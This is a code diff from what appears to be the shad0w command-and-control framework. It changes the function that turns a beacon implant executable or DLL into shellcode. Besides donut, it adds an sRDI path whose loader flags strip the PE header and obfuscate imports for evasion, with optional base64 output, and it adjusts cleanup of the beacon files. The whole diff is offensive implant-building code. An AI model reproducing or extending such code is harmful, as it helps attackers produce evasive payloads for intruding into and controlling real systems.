@@ -159,25 +159,43 @@ def make_in_clone(arch=None, platform=None, secure=None, static=None, builddir=N
     try:
         open(modlocation, 'rb')
     except FileNotFoundError:
-        print("ERROR: building module")
         return False
 
     return True
 
-def extract_shellcode(beacon_file="/root/shad0w/beacon/beacon.exe", want_base64=False):
-    # use donut to extract the shellcode from
+def extract_shellcode(beacon_file="/root/shad0w/beacon/beacon.exe", want_base64=False, donut=True, srdi=False):
+    # use donut or srdi to extract the shellcode from
     # our newly created beacon
 
-    # use donut to get it
-    if want_base64 is False:
-        code = shellcode.generate(beacon_file, None, None, parse=False)
+    if donut and not srdi:
+        # use donut to get it
+        if want_base64 is False:
+            code = shellcode.generate(beacon_file, None, None, parse=False)
 
-    elif want_base64 is True:
-        code = base64.b64encode(shellcode.generate(beacon_file, None, None, parse=False)).decode()
+        elif want_base64 is True:
+            code = base64.b64encode(shellcode.generate(beacon_file, None, None, parse=False)).decode()
+
+    if srdi:
+        # use srdi to get the shellcode
+
+        # flags to pass the loader
+        flags = 0
+
+        # null out the pe header
+        flags |= 0x1
+
+        # obfusicate the imports, with no delay
+        flags = flags | 0x4 | 0 << 16
+
+        if want_base64 is False:
+            code = shellcode.generate_srdi(beacon_file, flags)
+
+        elif want_base64 is True:
+            code = base64.b64encode(shellcode.generate_srdi(beacon_file, flags)).decode()
 
     return code
 
-def write_and_bridge(filename, rcode):
+def write_and_bridge(filename, rcode, noremove=False):
     # write the supplied code to the file given
     # by the user and then make sure they can access it
 
@@ -186,7 +204,8 @@ def write_and_bridge(filename, rcode):
 
     # remove the old beacon file, this wont always be the name though
     try:
-        os.unlink("/root/shad0w/beacon/beacon.exe")
+        if not noremove: os.unlink("/root/shad0w/beacon/beacon.exe")
+        if not noremove: os.unlink("/root/shad0w/beacon/beacon.dll")
     except FileNotFoundError: pass
 
     with open(filename, 'wb') as file:
